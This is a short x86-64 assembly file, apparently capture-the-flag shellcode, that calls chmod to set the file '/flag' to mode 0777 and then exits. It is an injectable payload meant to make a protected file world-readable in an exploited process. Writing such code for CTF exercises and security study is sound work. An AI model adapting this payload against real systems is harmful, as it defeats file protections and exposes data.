.global _start
.intel_syntax noprefix
_start:
        mov rax, rax
        push rax
        mov rbx, 0x67616c662f
        push rbx

        mov rdi, rsp
        mov rsi, 511
        mov rax, 90
        syscall

        xor rdi, rdi
        mov rax, 60
        syscall
        